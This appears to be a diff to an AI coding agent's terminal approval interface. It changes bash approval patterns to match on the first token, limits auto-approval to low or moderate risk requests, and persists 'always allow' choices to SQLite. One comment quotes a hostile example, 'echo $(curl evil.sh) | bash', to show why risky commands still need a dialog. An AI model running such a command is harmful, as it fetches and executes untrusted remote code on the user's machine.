@@ -53,9 +53,11 @@ function generateApprovalPattern(request: TypesApprovalRequest): string {
 
   // Tool-specific key extraction
   if (tool === 'bash' && typeof args.command === 'string') {
-    // Extract base command: "npm test --coverage" → "npm test"
+    // Extract base command only: "npm test --coverage" → "npm"
+    // Using just the first token prevents pattern fragmentation (e.g., "sed -i" vs "sed 's/...'")
+    // Safety: high/critical risk commands are blocked from auto-approve via risk guard
     const parts = args.command.trim().split(/\s+/);
-    const baseCmd = parts.slice(0, 2).join(' '); // First 2 tokens
+    const baseCmd = parts[0]; // Base command only: "sed", "npm", "git", etc.
     return `bash:${baseCmd}`;
   }
 
@@ -646,7 +648,9 @@ export function TUIApp({
   const handleApprovalRequest = useCallback((request: TypesApprovalRequest) => {
     // Check if this matches an always-allowed pattern
     const pattern = generateApprovalPattern(request);
-    if (alwaysAllowed.has(pattern)) {
+    // Only auto-approve low/moderate risk — high/critical always show dialog
+    // This prevents e.g. approving "bash:echo" from auto-approving "echo $(curl evil.sh) | bash"
+    if (alwaysAllowed.has(pattern) && (request.risk === 'low' || request.risk === 'moderate')) {
       // Auto-approve without showing dialog
       approvalBridge?.resolve({ approved: true });
       return;
@@ -678,17 +682,22 @@ export function TUIApp({
     }
   }, [approvalBridge]);
 
-  // Always allow this pattern for the rest of the session
+  // Always allow this pattern for the rest of the session + persist to SQLite
   const handleAlwaysAllow = useCallback(() => {
     if (approvalBridge && pendingApprovalRef.current) {
       const pattern = generateApprovalPattern(pendingApprovalRef.current);
       setAlwaysAllowed(prev => new Set(prev).add(pattern));
+      // Persist to SQLite for session-scoped persistence
+      const tool = pendingApprovalRef.current.tool || pendingApprovalRef.current.action || 'unknown';
+      if ('rememberPermission' in sessionStore && typeof sessionStore.rememberPermission === 'function') {
+        sessionStore.rememberPermission(tool, 'always', pattern);
+      }
       approvalBridge.resolve({ approved: true });
       setPendingApproval(null);
       setDenyReasonMode(false);
       setDenyReason('');
     }
-  }, [approvalBridge]);
+  }, [approvalBridge, sessionStore]);
 
   // Enter deny with reason mode
   const handleDenyWithReason = useCallback(() => {
@@ -710,6 +719,33 @@ export function TUIApp({
       });
     }
   }, [approvalBridge, handleApprovalRequest]);
+
+  // Hydrate always-allowed patterns from SQLite on mount
+  useEffect(() => {
+    if (
+      'hasRememberedPermissionsFeature' in sessionStore &&
+      typeof sessionStore.hasRememberedPermissionsFeature === 'function' &&
+      sessionStore.hasRememberedPermissionsFeature() &&
+      'listRememberedPermissions' in sessionStore &&
+      typeof sessionStore.listRememberedPermissions === 'function'
+    ) {
+      const remembered = sessionStore.listRememberedPermissions() as Array<{
+        toolName: string;
+        pattern?: string;
+        decision: 'always' | 'never';
+        createdAt: string;
+      }>;
+      if (remembered.length > 0) {
+        setAlwaysAllowed(prev => {
+          const next = new Set(prev);
+          for (const r of remembered) {
+            if (r.decision === 'always' && r.pattern) next.add(r.pattern);
+          }
+          return next;
+        });
+      }
+    }
+  }, [sessionStore]);
 
   // =========================================================================
   // UNIFIED EVENT HANDLER
